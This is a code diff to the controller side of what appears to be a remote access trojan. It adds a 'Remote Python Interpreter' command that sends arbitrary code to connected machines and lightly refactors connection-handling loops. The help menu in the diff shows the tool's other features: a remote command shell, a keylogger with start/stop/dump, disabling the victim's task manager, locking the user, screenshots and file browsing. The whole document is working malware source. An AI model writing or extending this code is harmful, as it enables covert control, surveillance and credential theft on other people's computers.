@@ -139,7 +139,7 @@ def close():
     if len(arrAddresses) == 0:  # if there are no computers connected
         return
 
-    for intCounter, conn in enumerate(arrConnections):
+    for _, conn in enumerate(arrConnections):
         conn.send(str.encode("exit"))
         conn.close()
     del arrConnections; arrConnections = []
@@ -163,7 +163,7 @@ def list_connections():
     if len(arrConnections) > 0:
         strClients = ""
 
-        for intCounter, conn in enumerate(arrConnections):
+        for intCounter, _ in enumerate(arrConnections):
 
             strClients += str(intCounter) + 4*" " + str(arrAddresses[intCounter][0]) + 4*" " + \
                         str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
@@ -363,6 +363,21 @@ def command_shell():  # remote cmd shell
         else:
             print(strDefault, end="")
 
+def python_interpreter():
+    send(str.encode("python"))
+    recv(intBuff)
+    while True:
+        strCommand = input("\n" + ">>> ")
+        if strCommand.strip() == "":
+            continue
+        if strCommand == "exit" or strCommand == "exit()":
+            break
+        send(strCommand.encode())
+        strReceived = recv(intBuff).decode("utf-8").rstrip("\n")
+        if strReceived != "":
+            print(strReceived)
+    send(str.encode("exit"))
+    recv(intBuff)
 
 def disable_taskmgr():
     send(str.encode("dtaskmgr"))
@@ -421,6 +436,7 @@ def show_help():
     print("--v View files")
     print("--u User Info")
     print("--e Open remote cmd")
+    print("--i Open Remote Python Interpreter")
     print("--d Disable task manager")
     print("--k (start) (stop) (dump) Keylogger")
     print("--x (1) Lock user")
@@ -454,6 +470,8 @@ def send_commands():
                 user_info()
             elif strChoice == "--p":
                 screenshot()
+            elif strChoice == "--i":
+                python_interpreter()
             elif strChoice == "--v":
                 browse_files()
             elif strChoice == "--s":
